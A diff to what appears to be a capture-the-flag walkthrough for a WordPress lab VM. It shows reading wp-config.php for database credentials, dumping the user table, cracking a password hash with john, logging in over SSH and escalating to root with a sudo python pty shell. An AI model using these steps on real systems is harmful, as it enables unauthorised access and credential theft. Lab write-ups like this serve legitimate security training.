@@ -94,6 +94,7 @@ cat /var/www/flag2.txt
 
 #### Exploit Used
   - Same exploit used to obtain flag 1
+  - 
 #### Method
 ```
 $ cat /var/www/html/wordpress/wp-config.php
@@ -122,19 +123,13 @@ $ mysql wordpress --user=root -pR@v3nSecurity
 >  select * from wp_users;
 ```
 ```
-exit
+exit;exit
 ```
 ```
 echo "steven:\$P\$Bk3VD9jsxx/loJoqNsURgHiaB23j7W/" > hash.txt
 ```
 ```
 john hash.txt
-```
-```
-exit
-```
-```
-exit
 ```
 ```
 ssh steven@192.168.1.110
@@ -145,6 +140,13 @@ sudo -l
 ```
 sudo python -c 'import pty;pty.spawn("/bin/bash")'
 ```
+```
+find / -iname "flag4*" 2> /dev/null
+```
+```
+cat /root/flag4.txt
+```
+
 -----
 
 
